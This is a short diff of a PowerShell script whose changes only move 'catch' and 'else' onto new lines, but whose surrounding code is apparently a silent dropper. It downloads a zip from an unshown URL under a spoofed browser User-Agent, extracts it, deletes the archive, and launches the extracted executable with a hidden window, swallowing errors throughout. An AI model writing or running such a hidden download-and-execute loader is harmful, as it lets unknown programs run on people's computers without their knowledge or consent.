@@ -50,7 +50,8 @@ try {
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
     $wc.DownloadFile($ZipUrl, $zipFile)
-} catch {
+}
+catch {
     exit
 }
 
@@ -62,7 +63,8 @@ if (-not (Test-Path $extractPath)) {
 try {
     Add-Type -AssemblyName System.IO.Compression.FileSystem
     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFile, $extractPath)
-} catch {
+}
+catch {
     Expand-Archive -LiteralPath $zipFile -DestinationPath $extractPath -Force
 }
 
@@ -72,7 +74,8 @@ Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
 # --- Execute extracted .exe silently ---
 if (Test-Path $outFile) {
     Start-Process -FilePath $outFile -WindowStyle Hidden -ErrorAction SilentlyContinue
-} else {
+}
+else {
     $found = Get-ChildItem -Path $extractPath -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
     if ($found) {
         Start-Process -FilePath $found.FullName -WindowStyle Hidden -ErrorAction SilentlyContinue
